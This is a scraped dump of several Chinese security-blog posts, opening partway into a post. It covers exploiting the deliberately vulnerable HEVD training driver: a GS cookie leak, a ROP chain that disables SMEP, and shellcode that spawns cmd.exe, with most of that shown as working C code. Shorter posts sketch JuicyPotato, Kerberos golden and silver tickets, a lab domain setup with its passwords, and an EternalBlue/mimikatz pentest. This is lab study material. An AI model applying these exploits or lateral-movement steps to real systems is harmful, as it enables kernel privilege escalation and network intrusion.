00000000`00000000ffff8788`219795a8 00000000`00000000ffff8788`219795b0 ffff8788`219796a0ffff8788`219795b8 00000000`000000001: kd&gt; r raxrax=0000ad10688998111: kd&gt; s rsp L1000 07 20 22ffff8788`219797e8 07 20 22 00 00 00 00 00-20 0d 07 27 86 c1 ff ff . &quot;..... ..&#x27;....ffff8788`21979988 07 20 22 00 86 c1 ff ff-00 00 00 00 00 00 00 00 . &quot;.............ffff8788`21979a48 07 20 22 00 ff ff ff ff-30 e8 d9 1f 07 00 00 00 . &quot;.....0.......ffff8788`21979ab8 07 20 22 00 00 00 00 00-30 e8 d9 1f 07 00 00 00 . &quot;.....0.......1: kd&gt; ? ffff8788`219797e8-rspEvaluate expression: 680 = 00000000`000002a8 利用之前的ulGetBase得到HEVD.sys的基地址 1230: kd&gt; dqs 0xfffff80522fe0000+3000fffff805`22fe3000 00006fd9`604347b3fffff805`22fe3008 ffff9026`9fbcb84c 再下断点看看是不是为这个值 1234560: kd&gt; gBreakpoint 0 hitHEVD!TriggerBufferOverflowStackGS+0x1b:fffff805`230666fb 4833c4 xor rax,rsp1: kd&gt; r raxrax=00006fd9604347b3 还真是，那么访问base+3000就可以得cookie值 如何读取？这个还真没办法，只能利用另外一个漏洞HEVD_IOCTL_ARBITRARY_WRITE，将该值修改为我们自己的值，也可以设置Ring3ToKernel中的一个地址的值为待写入的地方，然后利用这个漏洞将cookie写入 key值位于rsp上，利用NtQuerySystemInformation中的PSYSTEM_EXTENDED_PROCESS_INFORMATION可以得到， 但是后面又看不了了，这个时候我想了下，一个exp可以看到另外一个exp的栈地址，但是查看自身的时候已经不在上面了，或许改为线程执行可以？ 就用这种方法试试看 12[+] Found Ring3ToKernel.exeStack base 0xffffef8360dce000 Stack limit 0xffffef8360dc8000 偏移是一个定值，再回忆一下之前的cookie生成算法就能得cookie了 但是有个小问题，合成cookie时，rsp值变化了 考虑到push和sub所以：rsp = stack base - 0x868 - 0x258 此实，key值为：0000768c469d2a88，rsp = ffffef83619aa798， 12&gt;&gt;&gt; hex(0x0000768c469d2a88^(0xffffef83619aa798-0x258))&#x27;0xffff990f27078fc8&#x27; 得到cookie值为0xffff990f27078fc8 123456789101112131415161718printf(&quot;[*] Cookie Address 0x%llx\\n&quot;,cookie_addr);printf(&quot;[*] Atribute Write GET key value\\n&quot;);typedef struct _WRITE_WHAT_WHERE&#123; funcaddr* What; funcaddr* Where;&#125;arbitrary_write, * pArbitraryWrite;funcaddr value = 0;pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write));payload-&gt;What = (funcaddr*)cookie_addr;payload-&gt;Where = &amp;value;DWORD size = sizeof(payload);DWORD info = NULL;DeviceIoControl(hDevice, 0x22200B, payload, size, NULL, 0, &amp;info, NULL);printf(&quot;[*] Key value 0x%llx\\n&quot;, value); 然后就是经典常规栈溢出+ROP打法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970void StackOverflowGS(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; DWORD oldProtect; printf(&quot;[*] Start Exploit\\n&quot;); LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(cmd), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode_addr, cmd, sizeof(cmd)); ulGetStackLimit(L&quot;Ring3ToKernel.exe&quot;); funcaddr base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;); funcaddr pop_rcx = base + 0x20C64C; funcaddr mov_cr4_rcx = base + 0x39eb47; funcaddr hevd_base = ulGetKernelBase((PCHAR)&quot;HEVD.sys&quot;); funcaddr cookie_addr = hevd_base + 0x3000; printf(&quot;[*] Cookie Address 0x%llx\\n&quot;,cookie_addr); printf(&quot;[*] Atribute Write GET key value\\n&quot;); typedef struct _WRITE_WHAT_WHERE &#123; funcaddr* What; funcaddr* Where; &#125;arbitrary_write, * pArbitraryWrite; funcaddr value = 0; pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write)); payload-&gt;What = (funcaddr*)cookie_addr; payload-&gt;Where = &amp;value; DWORD size = sizeof(payload); DWORD info = NULL; DeviceIoControl(hDevice, 0x22200B, payload, size, NULL, 0, &amp;info, NULL); printf(&quot;[*] Key value 0x%llx\\n&quot;, value); funcaddr rsp = 0; scanf_s(&quot;%llx&quot;, &amp;rsp); rsp -= (0x868 + 0x258); printf(&quot;[*] RSP value 0x%llx\\n&quot;, rsp); rsp ^= value; printf(&quot;[*] Cookie value 0x%llx\\n&quot;, rsp); printf(&quot;[*] Start set ROP\\n&quot;); //RtlFillMemory(stackspace, 0x238, &#x27;A&#x27;); RtlFillMemory(stackspace, 0x200, &#x27;A&#x27;); size = 0x258; *(funcaddr*)(stackspace + 0x200) = (funcaddr)rsp; *(funcaddr*)(stackspace + 0x208) = (funcaddr)rsp; *(funcaddr*)(stackspace + 0x210) = (funcaddr)rsp; *(funcaddr*)(stackspace + 0x218) = (funcaddr)rsp; *(funcaddr*)(stackspace + 0x220) = (funcaddr)rsp; *(funcaddr*)(stackspace + 0x228) = (funcaddr)rsp; *(funcaddr*)(stackspace + 0x230) = (funcaddr)rsp; *(funcaddr*)(stackspace + 0x238) = (funcaddr)pop_rcx; *(funcaddr*)(stackspace + 0x240) = (funcaddr)0x00000000002506f8; *(funcaddr*)(stackspace + 0x248) = (funcaddr)mov_cr4_rcx; *(funcaddr*)(stackspace + 0x250) = (funcaddr)shellcode_addr; printf(&quot;[*] Spawning a new cmd.exe process\\n&quot;); system(&quot;pause&quot;); DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); system(&quot;cmd.exe&quot;);&#125; 微调exploit shellcode得仔细调整rsp值 很简单，和最开的是栈溢出一样，直接一个push两个ret，让rsp+0x28变成了rsp+0x10 还有就是泄露内核栈地址的时候得稳定，让其包含当前进程 我的解决方法简单粗暴，多线程和直接加 system(&quot;pause&quot;);，重新弄好的方案都能打包成一个函数了 1234567891011121314151617181920unsigned long long ulUseStackInfo(wchar_t ProcName[]) &#123; pStackInfo stackinfo = (pStackInfo)malloc(sizeof(StackInfo)); if (stackinfo == NULL) &#123; printf(&quot;[!] Can&#x27;t allocate memory\\n&quot;); return 0; &#125; stackinfo-&gt;ModuleName = ProcName; stackinfo-&gt;result = 0; HANDLE hThread = CreateThread(NULL, 0x100, (LPTHREAD_START_ROUTINE)ulGetStackLimit, stackinfo, NULL, NULL); if (hThread == NULL) &#123; printf(&quot;[!] Can&#x27;t get thread\\n&quot;); return 0; &#125; system(&quot;pause&quot;); WaitForSingleObject(hThread, INFINITE); funcaddr baseaddr = stackinfo-&gt;result; CloseHandle(hThread); free(stackinfo); return baseaddr;&#125; 最终exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768void StackOverflowGS(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; DWORD oldProtect; printf(&quot;[*] Start Exploit\\n&quot;); LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(cmd), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode_addr, cmd, sizeof(cmd)); funcaddr stack_base = ulUseStackInfo(L&quot;Ring3ToKernel.exe&quot;); funcaddr base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;); funcaddr pop_rcx = base + 0x20C64C; funcaddr mov_cr4_rcx = base + 0x39eb47; funcaddr hevd_base = ulGetKernelBase((PCHAR)&quot;HEVD.sys&quot;); funcaddr cookie_addr = hevd_base + 0x3000; printf(&quot;[*] Cookie Address 0x%llx\\n&quot;,cookie_addr); printf(&quot;[*] Atribute Write GET key value\\n&quot;); typedef struct _WRITE_WHAT_WHERE &#123; funcaddr* What; funcaddr* Where; &#125;arbitrary_write, * pArbitraryWrite; funcaddr value = 0; pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write)); payload-&gt;What = (funcaddr*)cookie_addr; payload-&gt;Where = &amp;value; DWORD size = sizeof(payload); DWORD info = NULL; DeviceIoControl(hDevice, 0x22200B, payload, size, NULL, 0, &amp;info, NULL); printf(&quot;[*] Key value 0x%llx\\n&quot;, value); funcaddr cookie = 0; stack_base -= (0x868 + 0x258); printf(&quot;[*] RSP value 0x%llx\\n&quot;, stack_base); cookie = stack_base ^ value; printf(&quot;[*] Cookie value 0x%llx\\n&quot;, cookie); printf(&quot;[*] Start set ROP\\n&quot;); RtlFillMemory(stackspace, 0x200, &#x27;A&#x27;); size = 0x258; //size = 0x200; *(funcaddr*)(stackspace + 0x200) = (funcaddr)cookie; *(funcaddr*)(stackspace + 0x208) = (funcaddr)0x00000000; *(funcaddr*)(stackspace + 0x210) = (funcaddr)0x00000000; *(funcaddr*)(stackspace + 0x218) = (funcaddr)0x00000000; *(funcaddr*)(stackspace + 0x220) = (funcaddr)0x00000000; *(funcaddr*)(stackspace + 0x228) = (funcaddr)0x00000000; *(funcaddr*)(stackspace + 0x230) = (funcaddr)0x00000000; *(funcaddr*)(stackspace + 0x238) = (funcaddr)pop_rcx; *(funcaddr*)(stackspace + 0x240) = (funcaddr)0x00000000002506f8; *(funcaddr*)(stackspace + 0x248) = (funcaddr)mov_cr4_rcx; *(funcaddr*)(stackspace + 0x250) = (funcaddr)shellcode_addr; printf(&quot;[*] Spawning a new cmd.exe process\\n&quot;); DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); system(&quot;cmd.exe&quot;);&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【Win Pwn】HEVD-任意地址写","slug":"win-hevd-exp-arbitrary-write","date":"2024-02-23T15:35:34.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/02/23/win-hevd-exp-arbitrary-write/","link":"","permalink":"https://joe1sn.eu.org/2024/02/23/win-hevd-exp-arbitrary-write/","excerpt":"非预期方法，暂时不会放出来","text":"非预期方法，暂时不会放出来 HEVD练习-任意地址写 漏洞点 一点好玩的 传入一个结构体，得到结构体过后写入内容 结构体 12345typedef struct _WRITE_WHAT_WHERE&#123; unsigned int* What; unsigned int* Where;&#125;arbitrary_write, *pArbitraryWrite; 这里我做一个比较有意思的事儿，比如修改某个变量的值 1234567891011121314151617181920printf(&quot;[*] Start Exploit\\n&quot;);pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write));if (payload == NULL) &#123; printf(&quot;[!] Malloc payload failed\\n&quot;); return;&#125;int vuln = 0x10000;int pay = 0xDEADBEEF;printf(&quot;[-] the vuln value is 0x%x\\n&quot;, vuln);payload-&gt;What = (unsigned int *)&amp;pay;payload-&gt;Where = (unsigned int *)&amp;vuln;DWORD size = sizeof(payload);DWORD info = 0;system(&quot;pause&quot;);DeviceIoControl(hDevice, ioctl, payload, size, NULL, 0, &amp;info, NULL);printf(&quot;[-] now vuln value is 0x%x&quot;, vuln); 利用ioctl的机制也可以实现读取某个地址的值 预期打法 最开始栈溢出我们提权使用的是修改当前的Token的低位并修改Token的Present和Enable，如果这里我们知道地址的话就可以做一样的操作了 但是在普通权限下不可能知道地址，那么我们是否能够覆盖HEVD驱动中的某些函数，使用类似inline hook的方式，将函数地址改为我们shellcode的地址，这样我们把问题变成了和内核栈溢出类似的情况了 利用之前的NtQueryInfomation的ulGetKernelBase函数可以获得HEVD的基地址 这里我就尝试覆写DbgPrintEx函数为shellcode 123456789101112131415161718192021222324252627282930313233343536printf(&quot;[*] Start Exploit\\n&quot;);pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write));if (payload == NULL) &#123; printf(&quot;[!] Malloc payload failed\\n&quot;); return;&#125;funcaddr hevd_base = ulGetKernelBase((PCHAR)&quot;HEVD&quot;);funcaddr dbgprint_addr = hevd_base + 0x2008;funcaddr nt_base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;);printf(&quot;[*] HEVD SYS kernel base %llx\\n&quot;, hevd_base);printf(&quot;[*] ntoskrnl kernel base %llx\\n&quot;, nt_base);printf(&quot;[*] HEVD DbgPrint Address %llx\\n&quot;, dbgprint_addr);printf(&quot;[*] Allocate Shellcode Space\\n&quot;);LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(cmd), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if (shellcode_addr == NULL) &#123; printf(&quot;[!] shellcode addr failed\\n&quot;); return;&#125;memcpy(shellcode_addr, cmd, sizeof(cmd));printf(&quot;[*] Shellcode addr %llx\\n&quot;, shellcode_addr);payload-&gt;What = (unsigned int *)&amp;shellcode_addr;payload-&gt;Where = (unsigned int *)dbgprint_addr;DWORD size = sizeof(payload);DWORD info = 0;system(&quot;pause&quot;);DeviceIoControl(hDevice, ioctl, payload, size, NULL, 0, &amp;info, NULL);system(&quot;cmd.exe&quot;); 注意，覆写的是HEVD_BASE+0x2008的值 所指向的值 成功覆写 现在比较麻烦的就是过SMEP保护。 可以利用之前GS保护使用的内核栈泄露 https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/ 直接在栈上布置参数和ROP链，要么取消SMEP，要么参考KVAS直接使用ROP链申请的堆中执行，后续操作就和栈溢出一致，只不过需要把某个函数该地址改为第一个ROP地址 非预期利用 写到这里在翻查别人wp的时候突然想到驱动是一直在后台运行的，我们可以多次触发该漏洞，然后我用了一种非常规的方法，eee，目前这种方法我还用在一些项目上，所以暂时不公开…SORRY 方法可以参考：https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/ （虽然我的方法比他简单很多） 可以优雅退出不卡顿 引用 https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【内网】从PoC看JuicyPotato提权","slug":"potato-1","date":"2024-02-23T06:49:21.000Z","updated":"2024-02-23T06:53:20.081Z","comments":true,"path":"2024/02/23/potato-1/","link":"","permalink":"https://joe1sn.eu.org/2024/02/23/potato-1/","excerpt":"从此认识到自己不是做win安全的料","text":"从此认识到自己不是做win安全的料 个人认为JuictPotato的前身是著名的Rotten Potato 使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口 RPC 向代理发送 NTLM 协商包 代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证 注:此包被修改为强制本地身份验证. &amp; 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复 将两个数据包的内容混合以匹配本地协商并转发到RPC RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟 【PotatoAPI】创建COM监听器startCOMListenerThread 初始化WinSocket，创建非阻塞式socket，并监听-t端口。跳转到2，后面的就是监听循环中的 【LocalNegotiator】使用processNtlmBytes处理返回地NTLM信息。处理顺序刚好是1,2,3 首先获取安全主体的预先存在的凭据的句柄，初始化Client和Sever的Token，建立安全上下文（新进程的身份验证），转发给RPC RPC返回NTLM挑战应答问题，新进程的身份验证也会返回他的NTLM挑战应答问题，然后改装RPC的数据，塞入新进程的身份验证的NTLM挑战应答的部分数据 从系统回答中，创建新的system令牌 【PotatoAPI】同本地135端口建立RPC连接，发送消息从PotatoAPI-&gt;rpcSendQ走出队列 【PotatoAPI】触发triggerDCOM StgCreateDocfileOnILockBytes：创建Istorage对象 【IStorageTrigger】创建IStorageTrigger对象 CLSIDFromString：将CLSID字符转为COM对象 CoGetInstanceFromIStorage ：创建一个新的 对象，使用 IPersistFile：：Load初始化 触发DCOM后，进入1中的监听循环 通过得到的system token，经典的CreateProcessWithTokenW创建新的进程 要一个人写的话工作量还是挺大的，而且IstroageTrigger得自己构造，感谢开源PoC！ 参考 https://github.com/ohpe/juicy-potato https://forum.butian.net/share/860","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/tags/pentest/"}]},{"title":"【内网】探索Windows内网的Kerberos协议","slug":"kerberos","date":"2024-02-23T04:29:23.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/02/23/kerberos/","link":"","permalink":"https://joe1sn.eu.org/2024/02/23/kerberos/","excerpt":"感恩学校扎实的密码学功底，分析起来也是很简单的","text":"感恩学校扎实的密码学功底，分析起来也是很简单的 说白了就一张图 攻击方式 黄金票据 第三步中 使用 KDC 特定账户 Krbtgt 的 NTLM-Hash 时，如果我们有了该NTML-Hash那么就能做到伪造TGT 该方法由于需要DC的NTLM-Hash，所以用于留后门 假设我们拿到了DC上administrator权限的shell 抓取Hash CS使用的命令为：lsadump 相关项目：https://github.com/Xre0uS/MultiDump 获得管理员SID mimikatz一把梭 wmic useraccount get name,sid 切换到域内用户的普通权限，制作黄金票据 横向移动 先尝试访问文件夹 原因：https://support.microsoft.com/zh-cn/topic/ms16-101-windows-身份验证方法的安全更新程序说明-2016-年-8-月-9-日-be16a40d-d7e2-c4b2-d885-6a22cff3cb77 貌似是WinServer2012的硬伤了，虚拟机必须用一些补丁才能用vmtools… 白银票据 需要知道Server的HTLM-Hash 使用该值伪造TGT，在第七步中发送给Server 但是在有些服务中并没有验证 PAC 这一步，这也是白银票据能成功的前提，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC，PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提。 MS14-06 问题出在第四步 KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"【内网】环境搭建","slug":"ad-dc-1","date":"2024-02-20T13:56:00.000Z","updated":"2025-01-26T14:46:00.817Z","comments":true,"path":"2024/02/20/ad-dc-1/","link":"","permalink":"https://joe1sn.eu.org/2024/02/20/ad-dc-1/","excerpt":"Windows Server 2012 配置 怀念大学时光，在学网络配置的时候就是用的winserver 2012，最近想探究内网就翻出来学一学。","text":"Windows Server 2012 配置 怀念大学时光，在学网络配置的时候就是用的winserver 2012，最近想探究内网就翻出来学一学。 简单配置 vmware虚拟机安装就不多说了，主要是网络，我配置了两块网卡 NAT：连接到物理机网络 WinDC：构建vmware的虚拟局域网 关于vmtool安装 vmtool是通过DVD光盘的形式安装的，所以要开启自动检测；软盘也要相同的设置 装完了过后就很方便了 关闭防火墙 开启远程桌面 配置路由 添加角色和功能 里面选择 配置DHCP服务器（非必要） 添加角色和功能 里面选择 创建和激活作用域：工具-&gt;DHCP AD活动目录配置 AD和域控制器DC都在虚拟机上。 为了测试，安排一个Win7 局域网 Windows 7客户机 配置内网静态IP，设置DNS为域服务器IP 配置DC域控 提升为域控制器 密码：!234rewq 设置Administrator账户的密码为$321qwer 创建用户组织 用户组织可以用于委派等，是对组操作的最小单位 使用部门-&gt;个人的划分 这里就设置为 UserA部门的Alan用户 密码：!234rewq 将用户添加到域 检查域名解析 不能直接登录Alan的账户（因为是首次登陆），先登一次Admin的 然后重新设置该客户端的账户和密码 密码汇总 账户 密码 备注 administrator $321qwer 域管理员 Alan !234rewq 首次登陆 Alan $321qwer 首次登陆后更改密码 WinDC 1qazxsw@","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/tags/pentest/"}]},{"title":"【内网】内网渗透测试-新手村","slug":"intranet","date":"2024-02-15T02:58:20.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/02/15/intranet/","link":"","permalink":"https://joe1sn.eu.org/2024/02/15/intranet/","excerpt":"简单一层内网测试 去年的一篇，简单一层内网测试","text":"简单一层内网测试 去年的一篇，简单一层内网测试 入口点 http://xxx:16xx8 入口是个OA办公系统，使用某漏洞可以文件上传最后webshell实现RCE 扫描内网发现存活主机，同时上传cs大马 使用mimikatz抓取明文得到rdp密码后使用socks代理进入内网可以访问远程桌面 内网I 监控服务器 192.168.xx.50 该服务器存在ms17-010漏洞，但是有杀软，尝试使用psexec文件上传执行RCE失败，因为被杀软拦截了，可能修改横向移动方式能够绕过 也可以尝试使用command一句话+web_delivery上线 不过好在入口权限够高，192.168.xx.100时也扫出了RDP密码，也是直接上线了 内网II DHCP服务器 192.168.xx.250 一般来说DHCP服务器是域服务器，mimikatz没有抓到密码，不过还好有ms17-010漏洞，但是由于当时我没有使用正向payload所以使用的就是 web_delivery+command 上线，之后把msf的shell传递给cs来扫密码，得到密码后使用代理RDP上线 查看相关配置后基本可以肯定就是内网AD域控服务器 内网III 路由器网关 192.168.xx.1 H3C的交换机 没有打下来 总结 单层内网，结构简单，没有不出网的内网机器，新手村难度 基本全靠永恒之蓝+mimikatz，算是熟悉了工具和流程","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/tags/pentest/"}]},{"title":"【Win Pwn】HEVD-内核栈溢出(下)","slug":"win-hevd-exp-stackoverflow-III","date":"2024-01-25T07:07:41.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/01/25/win-hevd-exp-stackoverflow-III/","link":"","permalink":"https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/","excerpt":"上：https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/ 中：https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/ 文章已在先知社区投稿：https://xz.aliyun.com/t/13365 本附录对第二章的以下几个遗留问题做出说明 user编程寻找ROPGadget shellcode编写 Token提权 KVAS","text":"上：https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/ 中：https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/ 文章已在先知社区投稿：https://xz.aliyun.com/t/13365 本附录对第二章的以下几个遗留问题做出说明 user编程寻找ROPGadget shellcode编写 Token提权 KVAS user编程寻找ROPGadget ROP全称加返回导向性编程，比如这一章用到的Gadget 12345pop rcxretmov cr4, rcxret 关于ret汇编本质上就是从栈帧中取出值，然后将ip寄存器设置为该值，等价于pop ip，这样就能完成函数调用的返回等等。 本章中当我们发生栈溢出时，就会把ret的位置设置为第一段gadget的位置 pop rcx就会将此时栈顶的值0x00000000002506f8存入rcx寄存器，然后ret又从栈顶取出地址mov_rc4_rcx_ret，然后rip寄存器就跳转执行了 mov rc4, rcx将rcx值存入rc4中然后ret又将栈顶的值shellcode_addr设置为rip寄存器的值后返回 细心一点就会发现本章截图中的地址不一样，因为内核加载时的内存虚拟地址也是随机化的，不过寻址方式依旧是基地址+偏移 这就引申出函数第一段代码：找到内核的基地址 A.找到内核基地址 通过NtQuerySystemInformation 这个“半隐藏”函数实现的 MSDN：https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation 123456__kernel_entry NTSTATUS NtQuerySystemInformation( [in] SYSTEM_INFORMATION_CLASS SystemInformationClass, [in, out] PVOID SystemInformation, [in] ULONG SystemInformationLength, [out, optional] PULONG ReturnLength); 1[in, out] SystemInformation 指向接收请求信息的缓冲区的指针。 此信息的大小和结构因 SystemInformationClass 参数的值而异： 很可惜，关于SystemInformationClass微软并没有公开它的设计，网上有很多关于此的资料 SYSTEM_INFORMATION_CLASS：https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm 他是一个枚举，其中0xB就代表着要查询的是SystemModuleInformation SYSTEM_MODULE：http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html 123456789101112typedef struct _SYSTEM_MODULE &#123; ULONG Reserved1; ULONG Reserved2; PVOID ImageBaseAddress; ULONG ImageSize; ULONG Flags; WORD Id; WORD Rank; WORD w018; WORD NameOffset; BYTE Name[MAXIMUM_FILENAME_LENGTH];&#125; SYSTEM_MODULE, *PSYSTEM_MODULE; SystemInformation就是由SYSTEM_MODULE数组作为成员的结构体，这个没有官方文档，也是通过逆向得到的 1234typedef struct SYSTEM_MODULE_INFORMATION &#123; ULONG ModulesCount; SYSTEM_MODULE Modules[1];&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION; 关于查询函数的定义： 1unsigned long long ulGetKernelBase(PCHAR ModuleName); 首先从ntdll导入函数 然后初始化变量 查询后打印并返回，如果没有查到就返回0 123456789101112131415161718192021222324252627282930313233343536373839404142434445unsigned long long ulGetKernelBase(PCHAR ModuleName) &#123; PVOID kernelImageBase = NULL; PCHAR kernelImage = NULL; //import function `NtQuerySystemInformation` HMODULE ntdll = GetModuleHandle(TEXT(&quot;ntdll&quot;)); PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, &quot;NtQuerySystemInformation&quot;); if (NtQuerySystemInformation == NULL) &#123; printf(&quot;[!] GetProcAddress() failed.\\n&quot;); return 0; &#125; //init length ULONG len = 0; NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &amp;len); //init module infomations PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); if (pModuleInfo == NULL) &#123; printf(&quot;[!] [ulGetKernelBase] Could not allocate memory for module info.\\n&quot;); return 0; &#125; //starting quering NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &amp;len); if (status != (NTSTATUS)0x0) &#123; printf(&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\\n&quot;, status); return 0; &#125; for (unsigned int i = 0; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123; kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name; if (strstr(kernelImage, ModuleName)) &#123; kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress; printf(&quot;[*] [ulGetKernelBase] Mod name %s &quot;, kernelImage);#ifdef _WIN64 printf(&quot; Base Addr 0x%llx\\r\\n&quot;, kernelImageBase);#else printf(&quot; Base Addr 0x%X\\r\\n&quot;, kernelImageBase);#endif return (unsigned long long)kernelImageBase; &#125; &#125; return 0;&#125; B. 找到对应汇编 可以使用CTF常用工具ROPGadget，他支持PE格式（因为用的Capstone反汇编引擎） 1ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot; 试试ntoskrl.exe的 10x000000014039eb47 : mov cr4, rcx ; ret 得到基地址是0x39eb47，另外一个gadget同理 重写修改下EXP 12345678910unsigned long long base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;);unsigned long long pop_rcx = base+ 0x20C64C;unsigned long long mov_cr4_rcx = base+ 0x39eb47;printf(&quot;[*] Start set ROP\\n&quot;);*(unsigned long long*)(stackspace + 0x818) = (unsigned long long)pop_rcx;//set RCX = currentRC4*(unsigned long long*)(stackspace + 0x820) = (unsigned long long)0x00000000002506f8;*(unsigned long long*)(stackspace + 0x828) = (unsigned long long)mov_cr4_rcx;*(unsigned long long*)(stackspace + 0x830) = (unsigned long long)shellcode_addr; 一些常见的gadget字节序列 1234567891011&#123; &quot;RET&quot; , &#123; 0xC3 &#125;&#125;,&#123; &quot;POP_RAX&quot;, &#123; 0x58, 0xC3 &#125;&#125;,&#123; &quot;POP_RCX&quot;, &#123; 0x59, 0xc3 &#125;&#125;,&#123; &quot;MOV_CR4_RCX&quot;, &#123; 0x0f, 0x22, 0xe1, 0xc3 &#125;&#125;,&#123; &quot;NOP&quot;, &#123; 0x4d, 0xc3 &#125;&#125;,&#123; &quot;POP_RAX_POP_RCX&quot;, &#123; 0x58, 0x59, 0xc3 &#125;&#125;,&#123; &quot;MOV_RCX_PTRRAX&quot;, &#123; 0x48, 0x89, 0x08, 0xc3 &#125;&#125;,&#123; &quot;MOV_RAX_PTRRCX&quot;, &#123; 0x89, 0x01, 0xc3 &#125;&#125;,&#123; &quot;XOR_RAX_RAX&quot;, &#123; 0x48, 0x33, 0xc0, 0xc3 &#125;&#125;,&#123; &quot;XOR_ESI_ESI&quot;, &#123; 0x31, 0xf6, 0xc3 &#125;&#125;, 如果想直接从二进制读取（这样更快）可以使用：https://github.com/xct/windows-kernel-exploits 提供的思路去找 shellcode编写 A. 手动进行Token提权 第二章中使用的是他人提供的shellcode，这里尝试自己写汇编 注意，这里我们已经进入内核了，所以做的事情和user级别不一样 同KRPOCESS不同的是EPROCESS描述了程序运行的相关环境，例如：对应的KPROCESS指针、程序的权限等 在windbg中使用 ，可以列举所有的进程的相关信息 1!process 0 0 &lt;process_name&gt; 